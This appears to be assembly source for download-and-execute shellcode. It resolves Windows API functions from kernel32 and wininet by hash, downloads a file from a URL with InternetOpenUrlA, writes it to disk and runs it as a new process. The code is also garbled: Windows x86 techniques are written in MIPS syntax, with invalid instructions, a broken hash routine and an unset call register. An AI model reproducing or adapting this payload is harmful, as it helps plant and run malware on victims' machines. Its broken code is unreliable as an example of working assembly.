.section .text
.global _start

_start:
    ; Jump to the startup bounce point
    j _startup_bnc

find_kernel32:
    ; Preserve registers
    addiu $sp, $sp, -32
    sw $ra, 28($sp)
    sw $s0, 24($sp)
    sw $s1, 20($sp)
    sw $s2, 16($sp)
    sw $s3, 12($sp)
    sw $s4, 8($sp)
    sw $s5, 4($sp)
    move $s0, $zero
    lw $s0, 0x30($s0)
    beqz $s0, find_kernel32_9x
find_kernel32_nt:
    lw $s0, 0x0c($s0)
    lw $s1, 0x1c($s0)
    lw $s0, ($s1)
    lw $s0, 0x08($s0)
    b find_kernel32_finished
find_kernel32_9x:
    lw $s0, 0x34($s0)
    addiu $s0, $s0, 0x7c
    lw $s0, 0x3c($s0)
find_kernel32_finished:
    lw $ra, 28($sp)
    lw $s0, 24($sp)
    lw $s1, 20($sp)
    lw $s2, 16($sp)
    lw $s3, 12($sp)
    lw $s4, 8($sp)
    lw $s5, 4($sp)
    addiu $sp, $sp, 32
    jr $ra

find_function:
    ; Preserve all registers
    addiu $sp, $sp, -64
    sw $ra, 60($sp)
    sw $s0, 56($sp)
    sw $s1, 52($sp)
    sw $s2, 48($sp)
    sw $s3, 44($sp)
    sw $s4, 40($sp)
    sw $s5, 36($sp)
    sw $s6, 32($sp)
    sw $s7, 28($sp)
    sw $t0, 24($sp)
    sw $t1, 20($sp)
    sw $t2, 16($sp)
    sw $t3, 12($sp)
    sw $t4, 8($sp)
    sw $t5, 4($sp)
    move $s0, $a0
    lw $s1, 0x3c($s0)
    lw $s2, 0x78($s0)
    add $s2, $s2, $s0
    lw $s3, 0x18($s2)
    lw $s4, 0x20($s2)
    add $s4, $s4, $s0
find_function_loop:
    beqz $s3, find_function_finished
    addiu $s3, $s3, -1
    lw $s5, ($s4)
    add $s5, $s5, $s0
    move $s6, $zero
    move $s7, $zero
compute_hash:
    lbu $t0, ($s5)
    beqz $t0, compute_hash_finished
    srl $s6, $s6, 13
    addu $s6, $s6, $t0
    addiu $s5, $s5, 1
    b compute_hash
compute_hash_finished:
    lw $t1, 0x28($sp)
    bne $s6, $t1, find_function_loop
    lw $s5, 0x24($s2)
    add $s5, $s5, $s0
    lhu $s3, ($s5)
    lw $s5, 0x1c($s2)
    add $s5, $s5, $s0
    lw $s5, ($s5)
    add $s5, $s5, $s0
    sw $s5, 0x1c($sp)
find_function_finished:
    lw $ra, 60($sp)
    lw $s0, 56($sp)
    lw $s1, 52($sp)
    lw $s2, 48($sp)
    lw $s3, 44($sp)
    lw $s4, 40($sp)
    lw $s5, 36($sp)
    lw $s6, 32($sp)
    lw $s7, 28($sp)
    lw $t0, 24($sp)
    lw $t1, 20($sp)
    lw $t2, 16($sp)
    lw $t3, 12($sp)
    lw $t4, 8($sp)
    lw $t5, 4($sp)
    addiu $sp, $sp, 64
    jr $ra

_startup_bnc:
    j _startup

resolve_symbols_for_dll:
    lw $a0, ($a1)
    addiu $a1, $a1, 4
    sw $a0, 0($a2)
    addiu $a2, $a2, 4
    bne $a1, $a3, resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    jr $ra

kernel32_symbol_hashes:
    .word 0xec0e4e8e
    .word 0x7c0017a5
    .word 0xe80a791f
    .word 0x0ffd97fb
    .word 0x16b3fe72
    .word 0x73e2d87e

wininet_symbol_hashes:
    .word 0x57e84429
    .word 0x7e0fed49
    .word 0x5fe34b8b

_startup:
    addiu $sp, $sp, -96
    move $fp, $sp
    j _get_absolute_address_forward
_get_absolute_address_middle:
    j _get_absolute_address_end
_get_absolute_address_forward:
    jal _get_absolute_address_middle
_get_absolute_address_end:
    lw $ra, ($sp)
    jal _find_kernel32
    move $s0, $v0
resolve_kernel32_symbols:
    addiu $ra, $ra, -0x3a
    addiu $ra, $ra, -1
    addiu $a2, $fp, 4
    move $a3, $ra
    addiu $a3, $a3, 0x18
    jal _resolve_symbols_for_dll
resolve_wininet_symbols:
    addiu $a3, $a3, 0x0c
    li $a0, 0x74656e01
    sra $a0, $a0, 8
    sw $a0, -4($sp)
    sw 0x696e6977, -8($sp)
    move $a2, $sp
    jal _resolve_symbols_for_dll
internet_open:
    move $a0, $zero
    sw $a0, -4($sp)
    sw $a0, -8($sp)
    sw $a0, -12($sp)
    sw $a0, -16($sp)
    jal _InternetOpenA
    sw $v0, 0x34($fp)
internet_open_url:
    move $a0, $zero
    sw $a0, -4($sp)
    sw $a0, -8($sp)
    sw $a0, -12($sp)
    sw $a0, -16($sp)
    addiu $a1, $fp, 0x40
    sw $a1, -20($sp)
    lw $a0, 0x34($fp)
    jal _InternetOpenUrlA
    sw $v0, 0x38($fp)
create_file:
    li $a0, 0x65
    sw $a0, -4($sp)
    sw 0x78652e61, -8($sp)
    sw $a0, -12($sp)
    li $a0, 0x82
    sw $a0, -16($sp)
    li $a0, 0x02
    sw $a0, -20($sp)
    move $a0, $zero
    sw $a0, -24($sp)
    sw $a0, -28($sp)
    li $a0, 0x40
    sll $a0, $a0, 0x18
    sw $a0, -32($sp)
    lw $a0, -12($sp)
    jal _CreateFile
    sw $v0, 0x3c($fp)
download_begin:
    li $a0, 0x010c
    subu $sp, $sp, $a0
    move $s1, $sp
download_loop:
    addiu $s2, $s1, 4
    sw $zero, 0($s2)
    li $a0, 0x0104
    addiu $s3, $s1, 8
    sw $s3, 4($sp)
    lw $a1, 0x38($fp)
    jalr $t9
    lw $a0, 4($s1)
    beqz $a0, download_finished
download_write_file:
    sw $zero, 0($sp)
    addiu $a0, $s1, 4
    lw $a1, 4($s1)
    addiu $a2, $s1, 8
    lw $a3, 0x3c($fp)
    jalr $t9
    b download_loop
download_finished:
    lw $a0, 0x3c($fp)
    jalr $t9
    li $a0, 0x010c
    addu $sp, $sp, $a0
initialize_process:
    li $a1, 0x54
    subu $sp, $sp, $a1
    move $s1, $sp
zero_structs:
    sw $zero, 0($s1)
    sw $zero, 4($s1)
    sw $zero, 8($s1)
    sw $zero, 12($s1)
    sw $zero, 16($s1)
    sw $zero, 20($s1)
    sw $zero, 24($s1)
    sw $zero, 28($s1)
    sw $zero, 32($s1)
    sw $zero, 36($s1)
    sw $zero, 40($s1)
    sw $zero, 44($s1)
    sw $zero, 48($s1)
    sw $zero, 52($s1)
initialize_structs:
    li $t0, 0x44
    sw $t0, 0($s1)
execute_process:
    addiu $s2, $s1, 0x44
    sw $s2, 4($sp)
    sw $s1, 8($sp)
    sw $zero, 12($sp)
    sw $zero, 16($sp)
    sw $zero, 20($sp)
    sw $zero, 24($sp)
    sw $zero, 28($sp)
    lw $a0, 0x30($fp)
    sw $a0, 32($sp)
    sw $zero, 36($sp)
    jalr $t9
exit_process:
    jalr $t9